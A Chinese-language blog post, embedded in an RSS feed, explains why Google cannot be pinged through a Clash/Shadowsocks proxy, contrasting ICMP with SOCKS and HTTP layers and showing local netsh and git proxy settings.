&lt;p&gt;当然，最重要的是注意分辨言论，自身安全，保护隐私，相信这点大家都明白，都可以做到，这也是对大家的信任。&lt;/p&gt;
&lt;p&gt;最后，如果可以看 Youtube 视频，直接看&lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/watch?v=XKZM_AjCUr0&amp;amp;list=PLqybz7NWybwUgR-S6m78tfd-lV4sBvGFG&amp;amp;index=1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这个&lt;/a&gt;系列，我写的只能算简单概括吧。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最后！！&lt;/strong&gt;
所以文章里不会提及具体方式的哦，只是想简单普及一下，不想让大家像我之前一样迷迷糊糊的。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;why-not-一&#34;&gt;why not （一）&lt;/h1&gt;
&lt;p&gt;墙墙是啥？&lt;/p&gt;
&lt;p&gt;通过&lt;strong&gt;IP地址封锁&lt;/strong&gt;，&lt;strong&gt;端口阻断&lt;/strong&gt;，&lt;strong&gt;DNS劫持和污染&lt;/strong&gt;，&lt;strong&gt;关键字屏蔽&lt;/strong&gt; 等技术对认为不符合要求（可以搜下审查制度）的互联网国际出口传输内容，进行干扰、阻断、屏蔽。
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 202; 
			flex-basis: 486px&#34;
	&gt;
	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/3.jpg&#34; data-size=&#34;1363x672&#34;&gt;
		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/3.jpg&#34;
			width=&#34;1363&#34;
			height=&#34;672&#34;
			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/3_hucd40f92ee44ab54ccf4818a6ef68cf0d_110433_480x0_resize_q75_box.jpg 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/3_hucd40f92ee44ab54ccf4818a6ef68cf0d_110433_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;why-can-一&#34;&gt;why can （一）&lt;/h1&gt;
&lt;p&gt;接下来，是为什么又能在浏览器访问到谷歌。这里有两种原理。&lt;/p&gt;
&lt;h2 id=&#34;1vpn&#34;&gt;1.VPN&lt;/h2&gt;
&lt;p&gt;刚刚说了，墙墙屏蔽的是那些不符合审查制度的网站，如果我们连接一台墙墙认为合理的服务器，把它作为一层代理，去完成用户想要做的事情，最后再返回结果，不就可以了吗？不由得去想谁能干这样的事情，VPN呀（virtual private network）！&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 204; 
			flex-basis: 491px&#34;
	&gt;
	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/4.jpg&#34; data-size=&#34;1364x666&#34;&gt;
		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/4.jpg&#34;
			width=&#34;1364&#34;
			height=&#34;666&#34;
			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/4_huee8dd0466f2863b2743a3ce3b6674e9b_90707_480x0_resize_q75_box.jpg 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/4_huee8dd0466f2863b2743a3ce3b6674e9b_90707_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;img&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;img&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;吼吼，看上去十分完美，但是……慢慢的，墙墙发现越来越多的流量都是先发送一个数据包请求和一个服务器建立加密连接，然后紧跟着一个代理请求，于是这种特征就被识别出来了，就寄了。（特征一被识别，提供 VPN 服务的服务器 IP 地址就会被封了）&lt;/p&gt;
&lt;h2 id=&#34;2shadowsocks&#34;&gt;2.Shadowsocks&lt;/h2&gt;
&lt;p&gt;接下来，一个更新的技术出现了，Shadowsocks（这既是一个技术的名字又是一类客户端的名字）。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 179; 
			flex-basis: 430px&#34;
	&gt;
	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/5.jpg&#34; data-size=&#34;1810x1009&#34;&gt;
		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/5.jpg&#34;
			width=&#34;1810&#34;
			height=&#34;1009&#34;
			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/5_hu56bf9ae0d2cdeb6aa88fc257edcd23a1_519710_480x0_resize_q75_box.jpg 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/5_hu56bf9ae0d2cdeb6aa88fc257edcd23a1_519710_1024x0_resize_q75_box.jpg 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;img&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;img&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Shadowsocks是将代理服务器拆开成Server端和client端，中间使用了socks网络传输协议。Socks 代理与应用层代理、 HTTP 层代理不同，Socks 代理只是简单地传递数据包，所以可以实现经过 墙墙量全部加密，从而消除明显的流量特征这个概念。&lt;/p&gt;
&lt;h1 id=&#34;how一&#34;&gt;how（一）&lt;/h1&gt;
&lt;p&gt;现在我们简单了解了墙墙 的大概工作思路，以及VPN和Shadowsocks的工作思路，我们再来看看理论上有几种方式实现。&lt;/p&gt;
&lt;h2 id=&#34;软件方向&#34;&gt;软件方向&lt;/h2&gt;
&lt;h3 id=&#34;1vpn-1&#34;&gt;1.VPN&lt;/h3&gt;
&lt;p&gt;虚拟私有网络，最早应用于一些大公司中，因私密通信的需求而产生，是一种端对端的虚拟私有专线，可避免通讯流量被中间人劫持。&lt;/p&gt;
&lt;p&gt;也就是说，访问谷歌能只是VPN刚好可以做到的，人家本来没想要干这个，而且VPN流量特征明显，早就可以被 GFW 完美探测并封锁。&lt;/p&gt;
&lt;p&gt;只有申请报备的企业用户才可正常使用VPN，比如科研机构，大型企业之类的。&lt;/p&gt;
&lt;p&gt;顺便吐槽一下，我手机里以前那些免费加速器基本都属于这种。&lt;/p&gt;
&lt;h3 id=&#34;2shadowsocks-及衍生品&#34;&gt;2.Shadowsocks 及衍生品&lt;/h3&gt;
&lt;p&gt;该类软件利用本地服务器加密流量，然后将加密流量发送至远程服务器解密。&lt;/p&gt;
&lt;p&gt;常见的应用软件有 Shadowsocks、ShadowsocksR、Shadowrocket、V2Ray、Clash、Surge。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;clash&lt;/strong&gt;是使用 GO 开的发一个基于规则的隧道代理软件，支持 HTTP/HTTPS/SOCKS/Shadowsocks/ShadowsocksR/V2Ray/Trojan 协议, 能更好的使用处理规则（就是你规定它该连啥）&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 200; 
			flex-basis: 480px&#34;
	&gt;
	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/download.png&#34; data-size=&#34;318x159&#34;&gt;
		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/download.png&#34;
			width=&#34;318&#34;
			height=&#34;159&#34;
			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/download_hu109ae194a1ca4c8a912d470a5f6e0278_2842_480x0_resize_box_3.png 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/download_hu109ae194a1ca4c8a912d470a5f6e0278_2842_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;download&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;download&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;硬件方向&#34;&gt;硬件方向&lt;/h2&gt;
&lt;h3 id=&#34;1路由&#34;&gt;1.路由&lt;/h3&gt;
&lt;p&gt;没错！&lt;/p&gt;
&lt;p&gt;将上面的软件部署在了路由器上，连接路由器的设备都可以通过路由器访问到谷歌。&lt;/p&gt;
&lt;p&gt;很不错的想法，但是遗憾的是大部分路由器在设计的时候算力只能满足基本的路由功能，而在通信产生大量的加解密运算，路由器算不过来，网就卡了……&lt;/p&gt;
&lt;p&gt;接着往下看，还有更好的方法。&lt;/p&gt;
&lt;h3 id=&#34;2-软路由&#34;&gt;2. 软路由&lt;/h3&gt;
&lt;p&gt;新主意，利用台式机或服务器配合软件形成路由解决方案，主要靠软件的设置，达成路由器的功能。这样既有《全局代理》的效果，又有足够的算力。&lt;/p&gt;
&lt;p&gt;但是缺点。。。比较麻烦。。。
接着往下看，还有更好的方法。&lt;/p&gt;
&lt;h3 id=&#34;3网关模式&#34;&gt;3.网关模式&lt;/h3&gt;
&lt;p&gt;通过一台计算机上跑的软件来实现路由器功能，代表性产品：Windows 下的 Clash，Mac 下的 Surge。&lt;/p&gt;
&lt;p&gt;相当于在本地局域网里部署了一个开启Clash或Surge的电脑当网关，任何在局域网内的设备都可以将此网关作为代理，访问互联网。&lt;/p&gt;
&lt;p&gt;这样有几个好处，一是效率高，方便；二是便于集中管理。&lt;/p&gt;
&lt;h1 id=&#34;why-not-二&#34;&gt;why not （二）&lt;/h1&gt;
&lt;p&gt;讲了这么多，还是不知道为什么不能ping到google。&lt;/p&gt;
&lt;p&gt;其实原因很简单，&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SOCKS协议在会话层 (第五层)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ICMP协议在网络层(第三层)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;而ping用的是ICMP协议。&lt;/p&gt;
&lt;p&gt;众所周知：前朝的剑斩不了本朝的官。
我拿上层的协议，去代理下层的服务？&lt;/p&gt;
&lt;p&gt;而我们之所以能够访问google是因为使用http协议，在&lt;strong&gt;应用层(第七层)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 177; 
			flex-basis: 426px&#34;
	&gt;
	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/1.png&#34; data-size=&#34;1277x719&#34;&gt;
		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/1.png&#34;
			width=&#34;1277&#34;
			height=&#34;719&#34;
			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/1_hu27d5c098c017076f48d4293e7e33a2ab_488644_480x0_resize_box_3.png 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/1_hu27d5c098c017076f48d4293e7e33a2ab_488644_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;1&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;1&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;how二&#34;&gt;how（二）&lt;/h1&gt;
&lt;p&gt;于是我们来解决这个问题，怎么ping到google？&lt;/p&gt;
&lt;p&gt;这里clash有个很好的功能，虚拟网卡。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TUN&lt;/strong&gt;与&lt;strong&gt;TAP&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在计算机网络中，&lt;strong&gt;TUN&lt;/strong&gt;与&lt;strong&gt;TAP&lt;/strong&gt;是操作系统内核中的虚拟网络设备。不同于普通靠硬件网络适配器实现的设备，这些虚拟的网络设备全部用软件实现，并向运行于操作系统上的软件提供与硬件的网络设备完全相同的功能。&lt;/p&gt;
&lt;p&gt;TAP等同于一个以太网设备，它操作第二层数据包如以太网数据帧。TUN模拟了网络层设备，操作第三层数据包比如IP数据包。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 111; 
			flex-basis: 268px&#34;
	&gt;
	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/12.png&#34; data-size=&#34;201x180&#34;&gt;
		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/12.png&#34;
			width=&#34;201&#34;
			height=&#34;180&#34;
			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/12_hufdca2f5e6053cff671745b6bf7dba609_145229_480x0_resize_box_3.png 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/12_hufdca2f5e6053cff671745b6bf7dba609_145229_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;12&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;12&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如图，被涂掉的网络是正常连的wifi，而下面的网络 3就是clash生成的虚拟网卡，就是这么神奇，clash的TAP 模式。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 139; 
			flex-basis: 333px&#34;
	&gt;
	&lt;a href=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/11.png&#34; data-size=&#34;448x322&#34;&gt;
		&lt;img src=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/11.png&#34;
			width=&#34;448&#34;
			height=&#34;322&#34;
			srcset=&#34;https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/11_hu06809faec8021013e9d23dbf4a94042b_14668_480x0_resize_box_3.png 480w, https://proben1.github.io/2021/%E6%80%8E%E4%B9%88ping%E4%B8%8D%E4%BA%86/index.assets/11_hu06809faec8021013e9d23dbf4a94042b_14668_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;11&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;11&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这样，我们就ping通google了。&lt;/p&gt;
&lt;p&gt;回到我最开始的目的，要更新github pages，就被轻而易举的解决了。&lt;/p&gt;
&lt;p&gt;但是还有其他的方法吗？&lt;/p&gt;
&lt;p&gt;有的。&lt;/p&gt;
&lt;p&gt;更改powershell的代理（要管理员权限）或者git的代理。（git以后会讲）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell设置代理
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;netsh winhttp set proxy 127.0.0.1:7890
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;取消代理
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;netsh winhttp reset proxy
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;查看代理
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;netsh winhttp show proxy
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git全局代理
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git config --global http.proxy http://127.0.0.1:7890
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git config --global https.proxy http://127.0.0.1:7890
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git取消全局代理：
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git config --global --unset http.proxy
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git config --global --unset https.proxy
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;7890是我的默认代理端口&lt;/p&gt;
&lt;p&gt;这样直接输代码肯定比之前name一大堆简单的多，可是为什么这样修改之后可以上传github pages却不能ping google呢？&lt;/p&gt;
&lt;p&gt;原因很明显，就是git和windows powershell 在osi模型上的层数在第三层之上，修改他们的代理也无法代理ICMP协议，也就ping不了google。但是连接github pages却用的更上层的协议。&lt;/p&gt;
&lt;h1 id=&#34;最后&#34;&gt;最后&lt;/h1&gt;
&lt;p&gt;最后再解释几个名词&lt;/p&gt;
&lt;p&gt;机场：提供特殊的、以私密方式上网的服务商（或平台）。&lt;/p&gt;
&lt;p&gt;VPS：Virtual Private Server
是将一台服务器分割成多个虚拟专用服务器的服务。&lt;/p&gt;
&lt;p&gt;可以这么理解，一些专业的人建立了很多VPS来付费（或免费）提供服务，这样你就不用再辛苦从外面买一台主机当做服务端了，用人家配好的就能直接访问谷歌。&lt;/p&gt;
&lt;p&gt;这些VPS放到一起，就变成了一个机场，可以供用户切换线路，找到不同的服务端。&lt;/p&gt;
&lt;p&gt;ps：想了解更多的推荐去看前面推荐的视频。&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
